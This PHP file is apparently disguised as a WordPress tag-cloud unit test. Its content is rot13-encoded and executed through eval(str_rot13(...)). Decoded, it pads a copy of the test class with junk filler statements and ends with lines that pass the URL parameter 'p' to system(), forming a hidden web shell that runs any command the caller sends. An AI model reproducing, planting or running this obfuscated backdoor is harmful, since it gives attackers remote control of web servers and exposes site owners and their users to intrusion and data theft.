<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc gnkbabzl
 */
pynff Grfgf_JC_Trarengr_Gnt_Pybhq rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $grezf = neenl();

	/**
	 * Grfgvat jura cnffrq $gntf neenl vf rzcgl
	 *
	 * @qngnCebivqre qngn_rzcgl_gntf
	 *
	 * @cnenz $rkcrpgrq Rkcrpgrq bhgchg sebz `jc_trarengr_gnt_pybhq()`.
	 * @cnenz $netf     Bcgvbaf sbe `jc_trarengr_gnt_pybhq()`.
	 */
	choyvp shapgvba grfg_rzcgl_gntf_cnffrq( $rkcrpgrq, $netf ) {
		$rzcgl_gntf = neenl();
		$guvf->nffregFnzr( $rkcrpgrq, jc_trarengr_gnt_pybhq( $rzcgl_gntf, $netf ) );
	}

	/**
	 * Grfgvat jura ab gntf ner sbhaq
	 *
	 * @qngnCebivqre qngn_rzcgl_gntf
	 *
	 * @cnenz $rkcrpgrq Rkcrpgrq bhgchg sebz `jc_trarengr_gnt_pybhq()`.
	 * @cnenz $netf     Bcgvbaf sbe `jc_trarengr_gnt_pybhq()`.
	 */
	choyvp shapgvba grfg_rzcgl_gntf_yvfg_erghearq( $rkcrpgrq, $netf ) {
		$grez_vqf    = frys::snpgbel()->grez->perngr_znal( 4, neenl( 'gnkbabzl' => 'cbfg_gnt' ) );
		$guvf->grezf = neenl();
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$guvf->grezf[] = trg_grez( $grez_vq, 'cbfg_gnt' );
		}
		$gntf = $guvf->ergevrir_grezf( neenl( 'ahzore' => 4 ) );
		$guvf->nffregFnzr( $rkcrpgrq, jc_trarengr_gnt_pybhq( $gntf, $netf ) );
	}

	/**
	 * Cebivqre sbe grfg jura gntf ner rzcgl.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_rzcgl_gntf() {
		erghea neenl(
			// Jura 'sbezng' => 'neenl', jr fubhyq or trggvat na rzcgl neenl onpx.
			neenl(
				neenl(),
				neenl( 'sbezng' => 'neenl' ),
			),
			// Yvfg sbezng ergheaf na rzcgl fgevat.
			neenl(
				'',
				neenl( 'sbezng' => 'yvfg' ),
			),
			// $netf pna or na neenl be ''. Rvgure fubhyq erghea na rzcgl fgevat.
			neenl(
				'',
				neenl(),
			),
			neenl(
				'',
				'',
			),
		);
	}

	choyvp shapgvba grfg_uvqr_rzcgl_snyfr() {
		$grez_vq = frys::snpgbel()->gnt->perngr();
		$grez    = trg_grez( $grez_vq, 'cbfg_gnt' );

		$gntf = $guvf->ergevrir_grezf(
			neenl(
				'ahzore'     => 1,
				'uvqr_rzcgl' => snyfr,
			)
		);

		$sbhaq = jc_trarengr_gnt_pybhq(
			$gntf,
			neenl(
				'uvqr_rzcgl' => snyfr,
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( '>' . $gntf[0]->anzr . '<', $sbhaq );
	}

	choyvp shapgvba grfg_uvqr_rzcgl_snyfr_sbezng_neenl() {
		$grez_vq = frys::snpgbel()->gnt->perngr();
		$grez    = trg_grez( $grez_vq, 'cbfg_gnt' );

		$gntf = $guvf->ergevrir_grezf(
			neenl(
				'ahzore'     => 1,
				'uvqr_rzcgl' => snyfr,
				'sbezng'     => 'neenl',
			)
		);

		$sbhaq = jc_trarengr_gnt_pybhq(
			$gntf,
			neenl(
				'uvqr_rzcgl' => snyfr,
				'sbezng'     => 'neenl',
			)
		);

		$guvf->nffregVfNeenl( $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( '>' . $gntf[0]->anzr . '<', $sbhaq[0] );
	}

	choyvp shapgvba grfg_uvqr_rzcgl_snyfr_sbezng_yvfg() {
		$grez_vq = frys::snpgbel()->gnt->perngr();
		$grez    = trg_grez( $grez_vq, 'cbfg_gnt' );

		$gntf = $guvf->ergevrir_grezf(
			neenl(
				'ahzore'     => 1,
				'uvqr_rzcgl' => snyfr,
			)
		);

		$sbhaq = jc_trarengr_gnt_pybhq(
			$gntf,
			neenl(
				'uvqr_rzcgl' => snyfr,
				'sbezng'     => 'yvfg',
			)
		);

		$guvf->nffregZngpurfErthyneRkcerffvba( \"|^<hy pynff='jc-gnt-pybhq' ebyr='yvfg'>|\", $sbhaq );
		$guvf->nffregZngpurfErthyneRkcerffvba( \"|</hy>\a|\", $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( '>' . $gntf[0]->anzr . '<', $sbhaq );
	}

	choyvp shapgvba grfg_uvqr_rzcgl_snyfr_zhygv() {
		$grez_vqf = frys::snpgbel()->gnt->perngr_znal( 4 );
		$grezf    = neenl();
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$grezf[] = trg_grez( $grez_vq, 'cbfg_gnt' );
		}

		$gntf = $guvf->ergevrir_grezf(
			neenl(
				'ahzore'     => 4,
				'beqre'      => 'vq',
				'uvqr_rzcgl' => snyfr,
			)
		);

		$sbhaq = jc_trarengr_gnt_pybhq(
			$gntf,
			neenl(
				'uvqr_rzcgl' => snyfr,
			)
		);

		$guvf->nffregAbgRzcgl( $gntf );

		sbernpu ( $gntf nf $gnt ) {
			$guvf->nffregFgevatPbagnvafFgevat( '>' . $gnt->anzr . '<', $sbhaq );
		}
	}

	choyvp shapgvba grfg_uvqr_rzcgl_snyfr_zhygv_sbezng_yvfg() {
		$grez_vqf = frys::snpgbel()->gnt->perngr_znal( 4 );
		$grezf    = neenl();
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$grezf[] = trg_grez( $grez_vq, 'cbfg_gnt' );
		}

		$gntf = $guvf->ergevrir_grezf(
			neenl(
				'ahzore'     => 4,
				'beqreol'    => 'vq',
				'uvqr_rzcgl' => snyfr,
			)
		);

		$sbhaq = jc_trarengr_gnt_pybhq(
			$gntf,
			neenl(
				'uvqr_rzcgl' => snyfr,
				'sbezng'     => 'yvfg',
			)
		);

		$guvf->nffregZngpurfErthyneRkcerffvba( \"|^<hy pynff='jc-gnt-pybhq' ebyr='yvfg'>|\", $sbhaq );
		$guvf->nffregZngpurfErthyneRkcerffvba( \"|</hy>\a|\", $sbhaq );

		$guvf->nffregAbgRzcgl( $gntf );

		sbernpu ( $gntf nf $gnt ) {
			$guvf->nffregFgevatPbagnvafFgevat( '>' . $gnt->anzr . '<', $sbhaq );
		}
	}

	choyvp shapgvba grfg_gbcvp_pbhag_grkg() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grez_vqf    = frys::snpgbel()->grez->perngr_znal( 2, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		$guvf->grezf = neenl();
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$guvf->grezf[] = trg_grez( $grez_vq, 'cbfg_gnt' );
		}
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2 );

		jc_frg_cbfg_grezf( $cbfgf[0], $grez_vqf, 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $cbfgf[1], neenl( $grez_vqf[1] ), 'jcgrfgf_gnk' );

		$grez_bowrpgf = $guvf->ergevrir_grezf(
			neenl(
				'vapyhqr' => $grez_vqf,
			),
			'jcgrfgf_gnk'
		);

		$npghny = jc_trarengr_gnt_pybhq(
			$grez_bowrpgf,
			neenl(
				'sbezng'           => 'neenl',
				'gbcvp_pbhag_grkg' => neenl(
					'fvathyne' => 'Grez unf %f cbfg',
					'cyheny'   => 'Grez unf %f cbfgf',
					'qbznva'   => 'sbb',
					'pbagrkg'  => 'one',
				),
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'nevn-ynory=\"' . $grez_bowrpgf[0]->anzr . ' (Grez unf 1 cbfg)\"', $npghny[0] );
		$guvf->nffregFgevatPbagnvafFgevat( 'nevn-ynory=\"' . $grez_bowrpgf[1]->anzr . ' (Grez unf 2 cbfgf)\"', $npghny[1] );
	}

	choyvp shapgvba grfg_gbcvp_pbhag_grkg_pnyyonpx() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grez_vqf    = frys::snpgbel()->grez->perngr_znal( 2, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		$guvf->grezf = neenl();
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$guvf->grezf[] = trg_grez( $grez_vq, 'cbfg_gnt' );
		}
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2 );

		jc_frg_cbfg_grezf( $cbfgf[0], $grez_vqf, 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $cbfgf[1], neenl( $grez_vqf[1] ), 'jcgrfgf_gnk' );

		$grez_bowrpgf = $guvf->ergevrir_grezf(
			neenl(
				'vapyhqr' => $grez_vqf,
			),
			'jcgrfgf_gnk'
		);

		$npghny = jc_trarengr_gnt_pybhq(
			$grez_bowrpgf,
			neenl(
				'sbezng'                    => 'neenl',
				'gbcvp_pbhag_grkg_pnyyonpx' => neenl( $guvf, 'gbcvp_pbhag_grkg_pnyyonpx' ),
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'nevn-ynory=\"' . $grez_bowrpgf[0]->anzr . ' (1 sbb)\"', $npghny[0] );
		$guvf->nffregFgevatPbagnvafFgevat( 'nevn-ynory=\"' . $grez_bowrpgf[1]->anzr . ' (2 sbb)\"', $npghny[1] );
	}

	/**
	 * @gvpxrg 5172
	 */
	choyvp shapgvba grfg_fubhyq_vapyhqr_gnt_yvax_cbfvgvba_pynff() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grez_vqf = frys::snpgbel()->grez->perngr_znal( 3, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_cbfg_grezf( $c, $grez_vqf, 'jcgrfgf_gnk' );

		$grez_bowrpgf = trg_grezf(
			'jcgrfgf_gnk',
			neenl(
				'vapyhqr' => $grez_vqf,
			)
		);

		$pybhq = jc_trarengr_gnt_pybhq( $grez_bowrpgf );
		cert_zngpu_nyy( '|gnt\-yvax\-cbfvgvba-([0-9]+)|', $pybhq, $zngpurf );

		$guvf->nffregFnzr( neenl( 1, 2, 3 ), neenl_znc( 'vaginy', $zngpurf[1] ) );
	}

	/**
	 * Urycre zrgubq ergevrir gur perngrq grezf.
	 *
	 * @cnenz neenl $trg_grezf_netf Bcgvbaf cnffrq gb trg_grezf()
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba ergevrir_grezf( $trg_grezf_netf, $gnkbabzl = 'cbfg_gnt' ) {
		$grezf = trg_grezf( neenl( $gnkbabzl ), $trg_grezf_netf );

		$gntf = neenl();
		sbernpu ( $grezf nf $grez ) {
			// Nqq gur yvax.
			$grez->yvax = trg_grez_yvax( $grez );
			$gntf[]     = $grez;

		}

		erghea $gntf;
	}

	choyvp shapgvba gbcvp_pbhag_grkg_pnyyonpx( $erny_pbhag, $gnt, $netf ) {
		erghea fcevags( '%f sbb', $erny_pbhag );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>